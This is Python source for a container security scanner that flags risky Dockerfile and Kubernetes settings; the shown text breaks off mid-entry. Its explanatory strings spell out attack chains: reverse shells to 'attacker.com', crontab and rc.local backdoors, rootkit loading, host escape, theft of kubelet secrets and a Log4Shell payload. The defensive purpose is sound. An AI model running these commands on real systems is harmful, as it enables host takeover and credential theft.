"""
Test suite for detecting Container Security vulnerabilities.
Supports: Dockerfile
"""
import re
from typing import Dict
import sys
from pathlib import Path

# Add parent directory to path for utils import
sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.code_locator import find_pattern_locations


class ContainerSecurityDetector:
    """Detects security vulnerabilities in Dockerfiles."""

    def __init__(self, use_severity_penalties: bool = False):
        """
        Initialize Container Security detector.

        Args:
            use_severity_penalties: If True, applies severity-weighted penalties to scoring.
                                   This provides more accurate scoring for mixed security patterns
                                   but changes historical benchmark results. Default False for
                                   backward compatibility with existing benchmarks.
        """
        self.vulnerabilities = []
        self.score = 0
        self.use_severity_penalties = use_severity_penalties

    def analyze(self, code: str, language: str = "dockerfile") -> Dict:
        """Analyze container configuration for security vulnerabilities."""
        if language.lower() == "dockerfile":
            return self._analyze_dockerfile(code)
        elif language == "yaml":
            # Check if it's Docker Compose or Kubernetes
            if 'version:' in code and 'services:' in code:
                return self._analyze_docker_compose(code)
            else:
                return self._analyze_kubernetes(code)
        elif language.lower() in ['bash', 'sh', 'shell', 'python', 'javascript']:
            # Check for Docker runtime commands
            return self._analyze_runtime_commands(code)

        # For other languages, return None to let the decorator handle it
        return None

    def _analyze_dockerfile(self, code: str) -> Dict:
        """Analyze Dockerfile for container security issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: Running as root (no USER directive)
        has_user_directive = re.search(r'^\s*USER\s+(?!root\b)\w+', code, re.MULTILINE)

        if not has_user_directive:
            # Check if there's a FROM instruction (valid Dockerfile)
            if re.search(r'^\s*FROM\s+', code, re.MULTILINE):
                locations = find_pattern_locations(code, r'^\s*FROM\s+')
                if locations:
                    self.vulnerabilities.append({
                        "type": "RUNNING_AS_ROOT",
                        "severity": "HIGH",
                        "description": "Container runs as root user - privilege escalation risk",
                        "recommendation": "Add USER directive to run as non-root: RUN useradd -m appuser && USER appuser",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = max(0, self.score - 1)

        # Pattern 2: Latest tag or unpinned versions
        # Fixed regex: Only flag :latest OR images with NO tag at all (not :18-alpine, :3.11-slim, etc.)
        if re.search(r'FROM\s+\S+:latest(?:\s|$)|FROM\s+[^\s:]+(?:\s|$)', code):
            locations = find_pattern_locations(code, r'FROM\s+\S+:latest|FROM\s+[^\s:]+')
            if locations:
                self.vulnerabilities.append({
                    "type": "UNPINNED_BASE_IMAGE",
                    "severity": "MEDIUM",
                    "description": "Base image uses :latest tag or no tag - supply chain risk",
                    "recommendation": "Pin specific image versions: FROM python:3.11.5-slim instead of FROM python:latest",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = max(0, self.score - 1)

        # Pattern 3: Hardcoded secrets in ENV or as build args
        # Pattern 3a: Secret keywords in variable NAMES (ENV PASSWORD=..., ENV API_KEY=...)
        secret_in_name = r'ENV\s+.*(?:PASSWORD|SECRET|KEY|TOKEN|CREDENTIALS?)\s*=\s*["\']?[^"\'\s]+|ARG\s+.*(?:PASSWORD|SECRET|KEY|TOKEN)\s*=\s*["\']?[^"\'\s]+'
        # Pattern 3b: Connection strings with embedded credentials in VALUES
        # Matches: postgresql://user:pass@host, mysql://user:pass@host, https://user:pass@host, redis://:pass@host
        secret_in_value = r'ENV\s+\S+\s*=\s*["\']?(?:(?:postgresql|mysql|mongodb|redis|amqp)://[^:]+:[^@\s]+@|(?:https?|ftp)://[^:]+:[^@\s]+@|[a-z_]+://:[^@\s]+@)'

        if re.search(secret_in_name, code, re.IGNORECASE) or re.search(secret_in_value, code, re.IGNORECASE):
            # Try to find specific locations (use secret_in_name pattern for location finding)
            locations = find_pattern_locations(code, secret_in_name + '|' + secret_in_value, re.IGNORECASE)
            if locations:
                self.vulnerabilities.append({
                    "type": "HARDCODED_SECRETS_IN_IMAGE",
                    "severity": "CRITICAL",
                    "description": "Hardcoded Secrets in Docker Image - ATTACK: Secrets in ENV or ARG are baked into image layers permanently. Anyone with image access can extract credentials: docker history, docker inspect, or unpacking image layers. EXPLOITATION: (1) Attacker pulls image from registry: docker pull company/app:latest, (2) Inspects layers: docker history --no-trunc company/app, (3) Sees ENV PASSWORD=SecretPass123, (4) Or unpacks layers: docker save company/app | tar -x, looks through JSON manifests, (5) Uses credentials to access databases, APIs. IMPACT: Credential Exposure (database passwords, API keys baked in layers), Unauthorized Access, Supply Chain Attack (compromised images distributed to all users). REAL-WORLD: CVE-2020-15157 (containerd credential exposure), Docker Hub 2019 (190k users' images exposed with credentials). IMAGE LAYERS: Docker layers are immutable - even if ENV removed later, credential remains in earlier layers. REGISTRY EXPOSURE: Public registries like Docker Hub → anyone can pull and extract secrets.",
                    "recommendation": "CRITICAL FIX: Never use ENV or ARG for secrets. DOCKER SECRETS: Use Docker BuildKit secrets (never stored in layers): RUN --mount=type=secret,id=api_key curl -H \"Authorization: $(cat /run/secrets/api_key)\" api.com. BUILD-TIME: Pass secrets via --secret flag: docker build --secret id=api_key,src=./key.txt. RUNTIME: Mount secrets at runtime: docker run -v /path/to/secret:/run/secrets/key:ro or use Docker Swarm/Kubernetes secrets. ENVIRONMENT VARIABLES: Load at runtime from external source: docker run -e DB_PASSWORD=$(aws secretsmanager get-secret-value --secret-id db-pass --query SecretString). CLEANUP: If secrets already in image, rebuild from scratch (can't remove from layers). VERIFICATION: Check for secrets: docker history --no-trunc image | grep -i 'password\\|secret\\|key'. TOOLS: Use trivy, grype, dockle to scan images for secrets.",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content'],
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "ENV or ARG directive with PASSWORD, SECRET, KEY, or TOKEN in name",
                            "Value assigned directly (not from buildtime/runtime source)",
                            "Credential baked into image layer"
                        ],
                        "why_vulnerable": [
                            f"Line {locations[0]['line_number']}: Hardcoded secret in Dockerfile",
                            "ENV directive writes secret to image layer permanently",
                            "docker history exposes ENV values in image build history",
                            "docker inspect shows environment variables",
                            "Image layers can be extracted: docker save → tar extract → read JSON",
                            "EXPLOITATION: docker history --no-trunc image reveals ENV PASSWORD=value",
                            "EXPLOITATION: docker save image | tar -x → extract layer → read credentials",
                            "EXPLOITATION: Public registry (Docker Hub) → anyone downloads image with secrets",
                            "REAL-WORLD: Docker Hub 2019 breach (190k users, exposed images with credentials)",
                            "IMMUTABLE LAYERS: Even if ENV removed in later layer, secret remains in earlier layer",
                            "IMPACT: Credential exposure → unauthorized database/API access"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "ENV directives",
                            "ARG directives",
                            "Keywords: PASSWORD, SECRET, KEY, TOKEN, CREDENTIALS",
                            "Assigned values (not referencing external sources)"
                        ],
                        "evidence": {
                            "found_patterns": ["Hardcoded secret in ENV or ARG"],
                            "line_numbers": [locations[0]['line_number']],
                            "code_snippets": [locations[0]['line_content']]
                        },
                        "attack_scenario": {
                            "step_1": "Developer builds Dockerfile with ENV API_KEY=sk_live_abcd1234",
                            "step_2": "Pushes image to Docker Hub: docker push company/app:v1.0",
                            "step_3": "Attacker discovers public image: docker search company/app",
                            "step_4": "Pulls image: docker pull company/app:v1.0",
                            "step_5": "Inspects build history: docker history --no-trunc company/app:v1.0",
                            "step_6": "Finds layer with ENV API_KEY=sk_live_abcd1234 in plaintext",
                            "step_7": "Alternatively unpacks image: docker save company/app:v1.0 -o app.tar && tar -xf app.tar",
                            "step_8": "Reads manifest.json and layer tars → extracts ENV API_KEY value",
                            "step_9": "Uses stolen API key to access production APIs, data",
                            "step_10": "Charges $50k to company's Stripe account, downloads customer database",
                            "impact": "Credential Exposure → API/Database Access → Data Breach + Financial Loss"
                        }
                    }
                })
                self.score = 0

        # Pattern 4: Vulnerable base images (Python 2.7, old Ubuntu, etc.)
        vulnerable_images = r'FROM\s+(?:python:2\.|ubuntu:14\.|ubuntu:16\.|node:10\.|debian:jessie|centos:6|centos:7)'
        if re.search(vulnerable_images, code):
            locations = find_pattern_locations(code, vulnerable_images)
            if locations:
                self.vulnerabilities.append({
                    "type": "VULNERABLE_BASE_IMAGE",
                    "severity": "HIGH",
                    "description": "Using outdated/vulnerable base image with known security issues",
                    "recommendation": "Update to supported versions: python:3.11-slim, ubuntu:22.04, node:20-alpine",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 5: Missing HEALTHCHECK
        has_healthcheck = re.search(r'^\s*HEALTHCHECK\s+', code, re.MULTILINE)
        if not has_healthcheck and re.search(r'^\s*FROM\s+', code, re.MULTILINE):
            # Only flag for service containers (those with EXPOSE)
            if re.search(r'^\s*EXPOSE\s+\d+', code, re.MULTILINE):
                locations = find_pattern_locations(code, r'^\s*EXPOSE\s+')
                if locations:
                    self.vulnerabilities.append({
                        "type": "MISSING_HEALTHCHECK",
                        "severity": "LOW",
                        "description": "Container lacks health check - orchestrators cannot detect failures",
                        "recommendation": "Add HEALTHCHECK instruction: HEALTHCHECK CMD curl -f http://localhost:8080/health || exit 1",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = max(0, self.score - 1)

        # Pattern 6: Privileged container indicators
        if re.search(r'--privileged|--cap-add\s+ALL', code):
            locations = find_pattern_locations(code, r'--privileged|--cap-add\s+ALL')
            if locations:
                self.vulnerabilities.append({
                    "type": "EXCESSIVE_CAPABILITIES",
                    "severity": "CRITICAL",
                    "description": "Excessive Container Capabilities - ATTACK: Docker --privileged flag or --cap-add ALL grants ALL Linux capabilities to container, including CAP_SYS_ADMIN. This allows container escape to host system: mount host filesystem, load kernel modules, modify kernel parameters. EXPLOITATION: (1) Attacker gains access to privileged container (via vulnerability, compromised credentials), (2) Lists capabilities: capsh --print, sees CAP_SYS_ADMIN, (3) Mounts host filesystem: mkdir /host && mount /dev/sda1 /host, (4) Reads host files: cat /host/etc/shadow → all user password hashes, (5) Writes to host: echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /host/etc/sudoers, (6) Escapes container → full host access. IMPACT: Container Escape (breakout to host OS), Privilege Escalation (root on host), Host Compromise (read/write host filesystem, install backdoors). REAL-WORLD: CVE-2019-5736 (runC container escape via /proc/self/exe), CVE-2020-15257 (containerd host access). CAPABILITIES: CAP_SYS_ADMIN = mount filesystems, CAP_SYS_MODULE = load kernel modules → full host control. PRIVILEGED MODE: Disables ALL container security features.",
                    "recommendation": "CRITICAL FIX: Never use --privileged or --cap-add ALL in production. LEAST PRIVILEGE: Drop all capabilities, add only specific ones needed: docker run --cap-drop ALL --cap-add NET_BIND_SERVICE app. COMMON CAPABILITIES: NET_BIND_SERVICE (bind ports <1024), CHOWN (change file ownership), SETUID/SETGID (change user/group). DANGEROUS CAPABILITIES: Avoid CAP_SYS_ADMIN (can mount /), CAP_SYS_MODULE (load kernel modules), CAP_SYS_PTRACE (attach debugger to any process), CAP_NET_RAW (packet sniffing), CAP_SYS_BOOT (reboot host). VERIFICATION: Check capabilities in running container: docker inspect | grep CapAdd, or inside container: capsh --print. SECURITY: Use AppArmor/SELinux profiles in addition to capability restrictions. KUBERNETES: Set securityContext.capabilities.drop: [ALL] and add: [specific].",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content'],
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "Docker command with --privileged flag",
                            "Or --cap-add ALL granting all Linux capabilities",
                            "Disables container security isolation"
                        ],
                        "why_vulnerable": [
                            f"Line {locations[0]['line_number']}: Container runs with excessive capabilities",
                            "--privileged disables ALL security features (namespaces, cgroups, capabilities)",
                            "CAP_SYS_ADMIN allows mounting host filesystem: mount /dev/sda1 /host",
                            "CAP_SYS_MODULE allows loading kernel modules → rootkit installation",
                            "Container can access raw host devices: /dev/mem, /dev/kmem",
                            "EXPLOITATION: mkdir /host && mount /dev/sda1 /host → read entire host filesystem",
                            "EXPLOITATION: echo '#!/bin/sh\\nnc attacker.com 4444 -e /bin/sh' > /host/etc/rc.local → backdoor on host",
                            "EXPLOITATION: nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash → escape to host PID 1 namespace",
                            "REAL-WORLD: CVE-2019-5736 runC escape (write to /proc/self/exe)",
                            "REAL-WORLD: CVE-2020-15257 containerd escape (gain host access)",
                            "IMPACT: Complete host compromise from containerized application"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "--privileged flag",
                            "--cap-add ALL",
                            "Capability grant patterns"
                        ],
                        "evidence": {
                            "found_patterns": ["Privileged container or all capabilities granted"],
                            "line_numbers": [locations[0]['line_number']],
                            "code_snippets": [locations[0]['line_content']]
                        },
                        "attack_scenario": {
                            "step_1": "Application container runs with docker run --privileged app",
                            "step_2": "Attacker exploits RCE vulnerability in web app (e.g., command injection)",
                            "step_3": "Gains shell in privileged container: nc -e /bin/sh attacker.com 4444",
                            "step_4": "Checks capabilities: capsh --print → sees CAP_SYS_ADMIN and all other caps",
                            "step_5": "Creates mount point: mkdir /host",
                            "step_6": "Mounts host root filesystem: mount /dev/sda1 /host",
                            "step_7": "Reads host shadow file: cat /host/etc/shadow → cracks passwords offline",
                            "step_8": "Adds backdoor user to host: echo 'backdoor:$6$encrypted:0:0::/root:/bin/bash' >> /host/etc/passwd",
                            "step_9": "Installs rootkit on host: cp rootkit.ko /host/lib/modules && chroot /host insmod /lib/modules/rootkit.ko",
                            "step_10": "Persists access: echo '@reboot nc attacker.com 4444 -e /bin/sh' >> /host/etc/crontab",
                            "impact": "Container Escape → Full Host Compromise → Persistent Backdoor → Data Breach + Ransomware"
                        }
                    }
                })
                self.score = 0

        # Pattern 7: Bloated images (apt-get without cleanup)
        has_apt_install = re.search(r'RUN\s+(?:.*\s+)?apt-get\s+install', code)
        if has_apt_install:
            # Check if cleanup commands are present
            has_cleanup = re.search(r'apt-get\s+clean|rm\s+-rf\s+/var/lib/apt/lists', code)
            if not has_cleanup:
                locations = find_pattern_locations(code, r'RUN\s+(?:.*\s+)?apt-get\s+install')
                if locations:
                    self.vulnerabilities.append({
                        "type": "BLOATED_IMAGE",
                        "severity": "LOW",
                        "description": "Package manager cache not cleaned - larger image size and attack surface",
                        "recommendation": "Clean up in same layer: RUN apt-get update && apt-get install -y pkg && apt-get clean && rm -rf /var/lib/apt/lists/*",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = max(0, self.score - 1)

        # Pattern 8: Shell form instead of exec form
        shell_form = r'^(CMD|ENTRYPOINT)\s+[^[]'
        if re.search(shell_form, code, re.MULTILINE):
            locations = find_pattern_locations(code, shell_form)
            if locations:
                self.vulnerabilities.append({
                    "type": "SHELL_FORM_EXEC",
                    "severity": "MEDIUM",
                    "description": "CMD/ENTRYPOINT uses shell form - signals not properly handled, shell injection risk",
                    "recommendation": "Use exec form: CMD [\"python\", \"app.py\"] instead of CMD python app.py",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = max(0, self.score - 1)

        # Pattern 9a: Copying .env files specifically (CRITICAL - contains secrets)
        env_files = r'COPY\s+(?:.*\s+)?\.env|ADD\s+(?:.*\s+)?\.env'
        if re.search(env_files, code):
            locations = find_pattern_locations(code, env_files)
            if locations:
                self.vulnerabilities.append({
                    "type": "COPYING_ENV_FILES",
                    "severity": "CRITICAL",
                    "description": ".env files copied into image - secrets will be baked into image layers permanently",
                    "recommendation": "Remove .env from Dockerfile. Use Docker BuildKit secrets (--secret) or runtime environment variables instead",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0
        # Pattern 9b: Copying all files with COPY . . (INFORMATIONAL - best practice reminder)
        elif re.search(r'COPY\s+\.\s+\.', code):
            locations = find_pattern_locations(code, r'COPY\s+\.\s+\.')
            if locations:
                self.vulnerabilities.append({
                    "type": "COPYING_ALL_FILES",
                    "severity": "INFO",
                    "description": "COPY . . includes all project files - ensure .dockerignore excludes sensitive files (.env, .git, etc.)",
                    "recommendation": "Best practice: Create .dockerignore with: .env .git node_modules __pycache__ *.log secrets/ .vscode/",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                # No score penalty - purely informational

        # Apply severity-weighted penalties (opt-in for backward compatibility)
        if self.use_severity_penalties:
            from utils.scoring import calculate_score_with_severity_penalties
            final_score = calculate_score_with_severity_penalties(
                self.vulnerabilities,
                self.score,
                2
            )
        else:
            # Default backward-compatible behavior
            final_score = self.score
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": final_score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_kubernetes(self, code: str) -> Dict:
        """Analyze Kubernetes YAML for container security issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: Running as root (no securityContext with runAsNonRoot)
        is_k8s_manifest = re.search(r'kind:\s*(?:Deployment|Pod|StatefulSet|DaemonSet)', code)

        if is_k8s_manifest:
            has_security_context = re.search(r'securityContext:\s*\n\s+runAsNonRoot:\s*true', code)

            if not has_security_context:
                locations = find_pattern_locations(code, r'kind:\s*(?:Deployment|Pod|StatefulSet|DaemonSet)')
                if locations:
                    self.vulnerabilities.append({
                        "type": "RUNNING_AS_ROOT",
                        "severity": "HIGH",
                        "description": "Container runs as root user - privilege escalation risk",
                        "recommendation": "Add securityContext with runAsNonRoot: true and runAsUser: 1000",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = max(0, self.score - 1)

        # Pattern 2: Privileged container
        if re.search(r'privileged:\s*true', code):
            locations = find_pattern_locations(code, r'privileged:\s*true')
            if locations:
                self.vulnerabilities.append({
                    "type": "PRIVILEGED_CONTAINER",
                    "severity": "CRITICAL",
                    "description": "Privileged Kubernetes Container - ATTACK: privileged: true in Kubernetes grants full host access to pod, equivalent to Docker --privileged. Pod can mount host filesystem, access all devices, modify kernel, escape container. EXPLOITATION: (1) Attacker compromises app in privileged pod, (2) Mounts host root: kubectl exec pod -- mount /dev/sda1 /mnt, (3) Accesses all host files, (4) Installs backdoor on host node. IMPACT: Container Escape, Full Node Compromise, Lateral Movement (pivot to other pods/nodes), Cluster Takeover. REAL-WORLD: CVE-2020-8559 (Kubernetes privilege escalation), Tesla K8s cryptomining 2018 (privileged pods). KUBERNETES: Privileged pods bypass PodSecurityPolicy, SecurityContext, admission controllers.",
                    "recommendation": "CRITICAL FIX: Remove privileged: true from securityContext. ADD SPECIFIC CAPABILITIES: Use capabilities.add: [NET_BIND_SERVICE] instead of privileged. POD SECURITY: Enforce PodSecurityPolicy or Pod Security Standards (restricted profile). ALTERNATIVES: Use hostPath only if absolutely necessary (prefer PersistentVolumes, ConfigMaps). NODE ACCESS: If node access needed, use DaemonSet with specific capabilities instead of privileged. MONITORING: Alert on privileged pod creation with admission webhook. KUBERNETES 1.25+: Use Pod Security Admission with enforce: restricted.",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content'],
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "Kubernetes manifest with privileged: true",
                            "In securityContext (pod or container level)",
                            "Grants full host access"
                        ],
                        "why_vulnerable": [
                            f"Line {locations[0]['line_number']}: Privileged Kubernetes pod",
                            "privileged: true = CAP_SYS_ADMIN + all capabilities + full device access",
                            "Pod can mount host filesystem: mount /dev/sda1 /mnt",
                            "Access all host devices: /dev/mem, /dev/kmem, /dev/sda",
                            "Bypass AppArmor, SELinux, seccomp profiles",
                            "EXPLOITATION: kubectl exec into pod → mount host → read/write any file",
                            "EXPLOITATION: Install rootkit on host node from pod",
                            "EXPLOITATION: Pivot to other pods via host network/filesystem access",
                            "REAL-WORLD: CVE-2020-8559 K8s privilege escalation via pod",
                            "REAL-WORLD: Tesla cryptomining 2018 (exposed K8s, deployed privileged pods)",
                            "IMPACT: One compromised pod → entire Kubernetes node compromised"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "securityContext.privileged field",
                            "Value set to true"
                        ],
                        "evidence": {
                            "found_patterns": ["Privileged Kubernetes container"],
                            "line_numbers": [locations[0]['line_number']],
                            "code_snippets": [locations[0]['line_content']]
                        },
                        "attack_scenario": {
                            "step_1": "Web app pod runs with privileged: true due to 'network troubleshooting needs'",
                            "step_2": "Attacker exploits RCE in web app: curl http://app/exec?cmd=whoami",
                            "step_3": "Gains shell in privileged pod: kubectl exec -it app-pod -- /bin/bash",
                            "step_4": "Checks privileges: capsh --print → sees all capabilities",
                            "step_5": "Mounts host root filesystem: mkdir /host && mount /dev/sda1 /host",
                            "step_6": "Reads all secrets on host: cat /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*",
                            "step_7": "Steals kubeconfig from host: cp /host/root/.kube/config /tmp/stolen-kubeconfig",
                            "step_8": "Compromises other pods: kubectl --kubeconfig=stolen-kubeconfig exec -it prod-db -- /bin/bash",
                            "step_9": "Deploys crypto-miner as DaemonSet on all nodes",
                            "step_10": "Exfiltrates data from entire cluster",
                            "impact": "Container Escape → Node Compromise → Cluster Takeover → Multi-Node Cryptomining/Ransomware"
                        }
                    }
                })
                self.score = 0

        # Pattern 3: Host path mounts
        if re.search(r'hostPath:', code):
            locations = find_pattern_locations(code, r'hostPath:')
            if locations:
                self.vulnerabilities.append({
                    "type": "HOST_PATH_MOUNT",
                    "severity": "CRITICAL",
                    "description": "Host Path Mount in Kubernetes - ATTACK: hostPath volumes mount host filesystem directories into pods, giving pods direct read/write access to node filesystem. Compromised pod can access sensitive host files, other pods' volumes, kubelet secrets, escape to node. EXPLOITATION: (1) Pod mounts hostPath: /var/lib/kubelet, (2) Attacker compromises pod, (3) Accesses all pods' secrets: cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/* , (4) Steals service account tokens, database credentials, (5) Uses tokens to access other pods/API server. IMPACT: Container Escape (access host filesystem), Lateral Movement (steal secrets from other pods), Cluster Compromise (access kubelet certs, kubeconfig). REAL-WORLD: CVE-2020-8554 (K8s hostPath escape), Shopify 2020 (hostPath misconfig exposed cluster). KUBELET DIRECTORY: /var/lib/kubelet contains ALL cluster secrets, pod configs, tokens. DOCKER SOCKET: Mounting /var/run/docker.sock allows pod to control Docker daemon → start privileged containers.",
                    "recommendation": "CRITICAL FIX: Remove hostPath mounts. ALTERNATIVES: (1) PersistentVolumes: Use cloud storage (EBS, GCS Persistent Disk) mounted as PV, (2) ConfigMaps: For configuration files, (3) Secrets: For credentials (encrypted at rest with KMS), (4) emptyDir: For temporary storage (deleted with pod). IF HOSTPATH REQUIRED: Limit to specific read-only files with hostPath.path: /specific/file (not /), set readOnly: true. FORBIDDEN PATHS: Never mount /, /var/lib/kubelet, /var/run/docker.sock, /etc, /root. POD SECURITY: Enforce PodSecurityPolicy to block hostPath. ADMISSION WEBHOOK: Reject pods with dangerous hostPath mounts. MONITORING: Alert on hostPath usage with admission logs.",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content'],
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "Kubernetes volume with hostPath type",
                            "Mounts host node filesystem into pod",
                            "Enables access to host files"
                        ],
                        "why_vulnerable": [
                            f"Line {locations[0]['line_number']}: hostPath volume mount",
                            "Pod can read/write host node filesystem",
                            "Access kubelet secrets: /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret",
                            "Access Docker socket: /var/run/docker.sock → control Docker daemon",
                            "Read other pods' volumes mounted on host",
                            "EXPLOITATION: cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/* → all secrets",
                            "EXPLOITATION: docker -H unix:///var/run/docker.sock run --privileged -it ubuntu → escape",
                            "EXPLOITATION: cat /etc/kubernetes/admin.conf → cluster-admin kubeconfig",
                            "REAL-WORLD: CVE-2020-8554 (K8s man-in-the-middle via hostPath)",
                            "REAL-WORLD: Shopify 2020 (hostPath misconfig exposed cluster secrets)",
                            "IMPACT: One pod with hostPath → access ALL pods' secrets on that node"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "volumes section",
                            "hostPath type",
                            "Host filesystem mount"
                        ],
                        "evidence": {
                            "found_patterns": ["hostPath volume mount"],
                            "line_numbers": [locations[0]['line_number']],
                            "code_snippets": [locations[0]['line_content']]
                        },
                        "attack_scenario": {
                            "step_1": "Monitoring pod deployed with hostPath: {path: /var/lib/kubelet} for 'observability'",
                            "step_2": "Attacker exploits Log4Shell in monitoring app: curl 'http://monitor/log?msg=${jndi:ldap://attacker/x}'",
                            "step_3": "Gains shell in monitoring pod: kubectl exec -it monitoring-pod -- /bin/bash",
                            "step_4": "Accesses mounted /var/lib/kubelet directory",
                            "step_5": "Lists all secrets on node: find /var/lib/kubelet/pods -name '*secret*' -type d",
                            "step_6": "Reads database pod's secret: cat /var/lib/kubelet/pods/db-pod-uid/volumes/kubernetes.io~secret/db-creds/password",
                            "step_7": "Finds service account token: cat /var/lib/kubelet/pods/api-pod-uid/volumes/kubernetes.io~projected/token",
                            "step_8": "Uses token to authenticate to API server: kubectl --token=$(cat token) get pods --all-namespaces",
                            "step_9": "Escalates to cluster-admin, deploys cryptominer DaemonSet across cluster",
                            "step_10": "Exfiltrates all application secrets, ransom demand for cluster recovery",
                            "impact": "Host Access → All Secrets on Node → Cluster Compromise → Ransomware"
                        }
                    }
                })
                self.score = 0

        # Pattern 4: Missing resource limits
        if is_k8s_manifest:
            has_resources = re.search(r'resources:\s*\n\s+limits:', code)

            if not has_resources:
                locations = find_pattern_locations(code, r'containers:')
                if locations:
                    self.vulnerabilities.append({
                        "type": "MISSING_RESOURCE_LIMITS",
                        "severity": "MEDIUM",
                        "description": "Container lacks resource limits - DoS risk",
                        "recommendation": "Add resources.limits for CPU and memory",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = max(0, self.score - 1)

        # Pattern 5: Hardcoded secrets in env
        secret_pattern = r'env:\s*\n\s+-\s*name:\s*(?:PASSWORD|SECRET|KEY|TOKEN)\s*\n\s+value:\s*["\']?[^\s]+'
        if re.search(secret_pattern, code, re.IGNORECASE):
            locations = find_pattern_locations(code, secret_pattern, re.IGNORECASE)
            if locations:
                self.vulnerabilities.append({
                    "type": "SECRETS_IN_POD_SPEC",
                    "severity": "CRITICAL",
                    "description": "Hardcoded Secrets in Kubernetes Pod Spec - ATTACK: Secrets hardcoded in env.value in Deployment/Pod manifests are stored in Git, etcd (K8s database), visible to anyone with kubectl access. EXPLOITATION: (1) Attacker gains read access to K8s cluster (compromised kubeconfig, RBAC misconfiguration), (2) Lists deployments: kubectl get deployments -o yaml, (3) Sees env.value with PASSWORD: Prod123Pass, (4) Uses credentials to access database, APIs. IMPACT: Credential Exposure (visible in kubectl get, etcd), Unauthorized Access, Git History (secrets in version control). REAL-WORLD: Tesla K8s 2018 (exposed secrets in pod specs), Shopify 2020 (secrets in YAML). ETCD: K8s stores all manifests in etcd - compromised etcd = all secrets. KUBECTL: kubectl get pod -o yaml shows env values in plaintext.",
                    "recommendation": "CRITICAL FIX: Never use env.value for secrets. KUBERNETES SECRETS: Store secrets separately: kubectl create secret generic db-creds --from-literal=password=value, reference with valueFrom.secretKeyRef: {name: db-creds, key: password}. EXTERNAL SECRETS: Use External Secrets Operator to sync from Vault, AWS Secrets Manager, Azure Key Vault. ENCRYPTION: Enable encryption at rest for etcd: --encryption-provider-config with KMS. SEALED SECRETS: Use Bitnami Sealed Secrets for GitOps (encrypted secrets in Git, decrypted in-cluster). RBAC: Restrict secret access with RBAC: create role with get secrets on specific secrets only. ROTATION: Automate secret rotation with External Secrets Operator. AUDIT: Monitor secret access with kubectl audit logs.",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content'],
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "env variable with PASSWORD, SECRET, KEY, or TOKEN in name",
                            "Uses value: (literal) instead of valueFrom.secretKeyRef",
                            "Credential stored in pod manifest"
                        ],
                        "why_vulnerable": [
                            f"Line {locations[0]['line_number']}: Hardcoded secret in pod spec",
                            "env.value stores secret in Deployment YAML → Git repository",
                            "kubectl get pod/deployment -o yaml shows secret in plaintext",
                            "Stored in etcd unencrypted (unless encryption-at-rest enabled)",
                            "Anyone with kubectl read access can view secrets",
                            "EXPLOITATION: kubectl get deployment app -o yaml | grep -i password",
                            "EXPLOITATION: kubectl get pod app -o yaml reveals env.value secrets",
                            "EXPLOITATION: etcd backup contains plaintext secrets",
                            "EXPLOITATION: Git history retains deleted secrets: git log -p deploy.yaml | grep PASSWORD",
                            "REAL-WORLD: Tesla K8s 2018 (exposed AWS keys in pod env.value)",
                            "IMPACT: Secret exposure to anyone with kubectl cluster access"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "env section in container spec",
                            "env.name with PASSWORD/SECRET/KEY/TOKEN",
                            "env.value (not valueFrom)"
                        ],
                        "evidence": {
                            "found_patterns": ["Hardcoded secret in pod env"],
                            "line_numbers": [locations[0]['line_number']],
                            "code_snippets": [locations[0]['line_content']]
                        },
                        "attack_scenario": {
                            "step_1": "Developer creates Deployment with env: [{name: DB_PASSWORD, value: MySecretPass}]",
                            "step_2": "Commits to Git: git add deploy.yaml && git commit -m 'Add deployment'",
                            "step_3": "Applies to cluster: kubectl apply -f deploy.yaml",
                            "step_4": "Attacker compromises developer laptop, steals kubeconfig",
                            "step_5": "Lists all deployments: kubectl get deployments --all-namespaces -o yaml > all-deploys.yaml",
                            "step_6": "Searches for secrets: grep -i 'password\\|secret\\|key' all-deploys.yaml",
                            "step_7": "Finds: env.name: DB_PASSWORD, env.value: MySecretPass",
